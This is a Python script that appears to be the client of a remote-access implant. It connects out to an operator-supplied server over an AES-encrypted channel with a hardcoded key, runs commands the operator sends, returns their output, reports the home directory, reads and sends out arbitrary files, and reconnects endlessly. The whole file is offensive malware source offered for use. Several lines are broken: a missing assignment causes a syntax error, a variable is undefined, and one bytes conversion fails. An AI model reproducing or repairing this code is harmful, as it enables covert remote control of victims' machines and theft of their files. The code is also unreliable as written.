#!/usr/bin/python3
import socket, sys, os, subprocess, argparse, time, ast, struct
from Crypto.Cipher import AES
parser = argparse.ArgumentParser(description='q*bert says hello')
parser.add_argument('-p', dest='port', required=True, type=int)
parser.add_argument('-s', dest='server', required=True)
args = parser.parse_args()
aeskey = b'This is a key123'
aesiv = b'This is an IV456'

def do_encrypt(message):
    if isinstance(message, bytes):
        pass
    else:
        message = bytes(message, 'utf-8')
    length = 16 - (len(message) % 16)
    message += bytes([length])*length
    obj = AES.new(aeskey, AES.MODE_CBC, aesiv)
    cipher = obj.encrypt(message)
    return cipher

def do_decrypt(ciphertext):
    obj2 = AES.new(aeskey, AES.MODE_CBC, aesiv)
    message = obj2.decrypt(ciphertext)
    message = message[:-message[-1]]
    return message

def get_data(conn, buff):
    bs = conn.recv(8)
    try:
        (length,) = struct.unpack('>Q', bs)
    except struct.error as err:
        print("{0}".format(err))
        return 0
    data = b''
    while len(data) < length:
        to_read = length - len(data)
        data += conn.recv(buff if to_read > buff else to_read)
    return data

def sendit(conn, message):
    length = struct.pack('>Q', len(message))
    conn.sendall(length)
    conn.sendall(message)

def main():
    global aeskey
    global aesiv
    conn=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    buff = 4096
    conn.connect((args.server, args.port))
    while True:
        try:
            data = get_data(conn, buff)
            if data == 0:
                break
            received str(do_decrypt(data).strip(), 'utf-8')
            command = received.split(' ')
            if 'cmd' in command:
                del command[0]
                output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                sendit(conn, do_encrypt(output.stdout))
            elif 'Arsenal' in command:
                sendit(conn, do_encrypt('Client initial checkin\nHomedir: %s\n' %os.environ.get('HOME')))
            elif 'get_file' in command:
                with open(command[1]) as f:
                    tmp = f.read()
                sendit(conn, do_encrypt(bytes(tmp)))
            elif 'aeskey' in command:
                message = ast.literal_eval(message)
                print(message)
                aeskey = message[1]
                aesiv = message[2]
                sendit(conn, do_encrypt('Updated AES key\n'))
        except socket.error as err:
            print("{0}\n".format(err))
    return

if __name__ == '__main__':
    while True:
            main()
